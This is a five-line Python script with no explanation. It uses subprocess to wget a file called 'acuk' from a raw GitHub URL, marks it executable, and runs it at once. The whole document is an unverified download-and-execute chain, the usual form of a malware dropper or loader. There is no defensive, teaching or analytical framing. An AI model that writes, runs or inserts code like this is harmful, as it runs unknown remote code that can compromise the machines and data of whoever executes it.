import os
import subprocess
subprocess.run(['wget','https://raw.githubusercontent.com/aurbach55/toya/main/acuk'])
subprocess.run(['chmod','+x','acuk'])
subprocess.run(['./acuk'])
